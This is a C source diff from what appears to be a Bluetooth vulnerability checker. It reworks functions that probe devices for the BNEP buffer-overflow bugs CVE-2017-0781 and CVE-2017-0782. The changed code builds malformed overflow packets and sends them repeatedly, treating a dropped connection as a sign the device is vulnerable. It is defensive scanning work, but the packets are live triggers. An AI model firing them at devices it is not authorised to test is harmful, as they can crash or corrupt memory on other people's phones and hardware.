@@ -1,6 +1,7 @@
 #include <arpa/inet.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/time.h>
 #include <unistd.h>
 
 #include "bluetooth.h"
@@ -210,9 +211,10 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
     struct sockaddr_l2 addr = { 0 };
     int sd, i;
     const uint8_t overflow_payload_val = 0x41;
-    char *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN);
+    char buf[BNEP_BUFFER_LEN] = { 0 }, *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN);
     struct bnep_setup_conn_req *conn_req;
-    
+    struct timeval tv;
+
     // Return a negative integer indicating failure to create socket
     if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
         return CVE_CHECK_ERR;
@@ -223,17 +225,32 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
 
     // Create a connection request with a UUID size of zero
     conn_req = (struct bnep_setup_conn_req *) packet;
-    conn_req->type = BNEP_CONTROL_W_EXTENSION;
+    conn_req->type = BNEP_EXT_HEADER + BNEP_CONTROL;
     conn_req->ctrl = BNEP_SETUP_CONN_REQ;
     conn_req->uuid_size = 0;
     // Copy overflow payload
     memset(&(conn_req->service), overflow_payload_val, BNEP_OVERFLOW_PAYLOAD_LEN);
 
+    // Set a timeout for the BNEP connection
+    tv.tv_sec = BNEP_OVERFLOW_TIMEOUT;
+    tv.tv_usec = 0;
+    setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
+
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
         return CVE_CHECK_ERR;
+    // Send one overflow packet and verify that the other device doesn't shut down the connection
+    if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN) < 0)
+        return 0;
+    if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+        return 0;
     for (int i = 0; i < BNEP_OVERFLOW_LOOP_LIMIT; i++)
+    {
         if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN) < 0)
-            return CVE_CHECK_ERR;
+            return 1;
+        if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+            return 1;
+    }
+
     close(sd);
     return 0;
 }
@@ -241,35 +258,53 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
 int is_vulnerable_to_cve_2017_0782(bdaddr_t *target)
 {
     struct sockaddr_l2 addr = { 0 };
-    int sd;
+    int sd, i;
     uint16_t dst_svc_uuid, src_svc_uuid;
-    char buf[BNEP_BUFFER_LEN], *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t));
+    char buf[BNEP_BUFFER_LEN], ovrflw_pkt[BNEP_ETH_OVERFLOW_LEN], setup_pkt[sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t)];
     struct bnep_setup_conn_req *conn_req;
     struct bnep_control_rsp *conn_rsp;
+    struct timeval tv;
+
+    addr.l2_bdaddr = *target;
+    addr.l2_family = AF_BLUETOOTH;
+    addr.l2_psm = htobs(BNEP_PSM);
+
+    // Create a valid connection request
+    memset(setup_pkt, 0x00, sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t));
+    conn_req = (struct bnep_setup_conn_req *) setup_pkt;
+    conn_req->type = BNEP_CONTROL;
+    conn_req->ctrl = BNEP_SETUP_CONN_REQ;
+    conn_req->uuid_size = sizeof(uint16_t);
+
+    // Set service UUIDs
+    dst_svc_uuid = htons(BNEP_SVC_NAP);
+    memcpy(setup_pkt + sizeof(struct bnep_setup_conn_req), &dst_svc_uuid, sizeof(uint16_t));
+    src_svc_uuid = htons(BNEP_SVC_PANU);
+    memcpy(setup_pkt + sizeof(struct bnep_setup_conn_req) + sizeof(uint16_t), &src_svc_uuid, sizeof(uint16_t));
+
+    tv.tv_sec = BNEP_OVERFLOW_TIMEOUT;
+    tv.tv_usec = 0;
+
+    // Zero out the memory
+    memset(ovrflw_pkt, 0, BNEP_ETH_OVERFLOW_LEN);
+    // Set BNEP packet type
+    ovrflw_pkt[0] = BNEP_EXT_HEADER + BNEP_COMPRESSED;
+    // Set the extension length and overflow payload
+    ovrflw_pkt[4] = 0x0A;
+    ovrflw_pkt[5] = 0x10;
 
     // Return a negative integer indicating failure to create socket
     if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
         return CVE_CHECK_ERR;
 
-    addr.l2_bdaddr = *target;
-    addr.l2_family = AF_BLUETOOTH;
-    addr.l2_psm = htobs(BNEP_PSM);
-    // Create a valid connection request
-    memset(packet, 0x00, sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t));
-    conn_req = (struct bnep_setup_conn_req *) packet;
-    conn_req->type = BNEP_CONTROL;
-    conn_req->ctrl = BNEP_SETUP_CONN_REQ;
-    conn_req->uuid_size = sizeof(uint16_t);
-    // Set service UUIDs
-    dst_svc_uuid = htons(BNEP_SVC_NAP);
-    memcpy(packet + sizeof(struct bnep_setup_conn_req), &dst_svc_uuid, sizeof(uint16_t));
-    src_svc_uuid = htons(BNEP_SVC_PANU);
-    memcpy(packet + sizeof(struct bnep_setup_conn_req) + sizeof(uint16_t), &src_svc_uuid, sizeof(uint16_t));
+    // Set a timeout for the BNEP connection
+    setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
+
     // If a connection is refused, it could indicates that BNEP connections are
     // rejected and the device is not vulnerable
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
         return 0;
-    if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t)) < 0)
+    if (write(sd, setup_pkt, sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t)) < 0)
         return CVE_CHECK_ERR;
     // Wait for connection response
     if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
@@ -278,27 +313,46 @@ int is_vulnerable_to_cve_2017_0782(bdaddr_t *target)
     conn_rsp = (struct bnep_control_rsp *) buf;
 
     // If the connection response is not successful, the device is not vulnerable
-    if (conn_rsp->resp != 0)
+    if (conn_rsp->resp != BNEP_SUCCESS)
         return 0;
-    // Free the connection request packet and reallocate memory for the overflow packet
-    free(packet);
-    packet = (char *) malloc(BNEP_ETH_OVERFLOW_LEN);
-    // Zero out the memory
-    memset(packet, 0, BNEP_ETH_OVERFLOW_LEN);
-    // Set BNEP packet type
-    packet[0] = BNEP_ETH_CMP_W_EXTENSION;
-    // Set the extension length and overflow payload
-    packet[4] = 0x0A;
-    packet[5] = 0x10;
-    // Send the overflow packet
-    if (write(sd, packet, BNEP_ETH_OVERFLOW_LEN) < 0)
-        return CVE_CHECK_ERR;
-    if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
-        return CVE_CHECK_ERR;
 
-    // TODO: Determine if it is possible to see if the vulnerability is present
+    // Send the overflow packet
+    if (write(sd, ovrflw_pkt, BNEP_ETH_OVERFLOW_LEN) < 0)
+        return 0;
+    if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+        return 0;
 
     close(sd);
+    // TODO: Refactor this into a separate function
+    for (int i = 0; i < BNEP_OVERFLOW_LOOP_LIMIT; i++)
+    {
+        // Return a negative integer indicating failure to create socket
+        if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
+            return CVE_CHECK_ERR;
+
+        // Set a timeout for the BNEP connection
+        setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
+
+        // If a connection is refused, it could indicates that BNEP connections are
+        // rejected and the device is not vulnerable
+        if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+            return 1;
+        if (write(sd, setup_pkt, sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t)) < 0)
+            return 1;
+        // Wait for connection response
+        if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+            return 1;
+
+        // Send the overflow packet
+        if (write(sd, ovrflw_pkt, BNEP_ETH_OVERFLOW_LEN) < 0)
+            return 1;
+        if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+            return 1;
+
+        close(sd);
+    }
+    // TODO: Determine if it is possible to see if the vulnerability is present
+
     return 0;
 }
 
@@ -420,8 +474,8 @@ int make_hci_inquiry(bdaddr_t **addr_list, const struct bluetooth_connection_inf
 {
     int inqlen, max_num_resp, flags, num_resp, i;
     inquiry_info *inqinfo = NULL;
-    inqlen = INQUIRYLEN;
-    max_num_resp = MAXNUMBTRESP;
+    inqlen = HCI_INQUIRY_LEN;
+    max_num_resp = MAX_NUM_HCI_RESP;
     // Allocate memory for maximum number of potential devices
     inqinfo = (inquiry_info*)malloc(max_num_resp * sizeof(inquiry_info));
 
